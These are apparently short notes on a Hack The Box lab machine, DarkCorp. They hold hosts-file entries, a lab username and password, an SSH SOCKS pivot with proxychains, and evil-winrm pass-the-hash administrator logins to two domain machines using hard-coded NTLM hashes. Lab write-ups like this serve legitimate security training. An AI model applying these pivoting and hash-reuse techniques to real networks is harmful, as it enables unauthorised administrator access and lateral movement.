https://github.com/yeyingsrc/Hackthebox-Walkthrough/blob/main/Insane/DarkCorp/Walkthrough.md

https://medium.com/@sg4642179/darkcorp-insane-full-walkthrough-26fdc14e127d

```sh
cat << EOF >> /etc/hosts
10.10.11.54 drip.htb
172.16.20.1 DC-01 DC-01.darkcorp.htb darkcorp.htb
172.16.20.2 WEB-01 WEB-01.darkcorp.htb
172.16.20.3 drip.darkcorp.htb
EOF
```

```sh
ebelford:ThePlague61780
ssh -D 0.0.0.0:1080 ebelford@drip.htb
```

`/etc/proxychains4.conf`:

```sh
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
# socks4  127.0.0.1 9050
socks5  127.0.0.1 1080
```

```sh
proxychains evil-winrm -i dc-01.darkcorp.htb -u administrator -H fcb3ca5a19a1ccf2d14c13e8b64cde0f
proxychains evil-winrm -i web-01.darkcorp.htb -u administrator -H 88d84ec08dad123eb04a060a74053f21
```
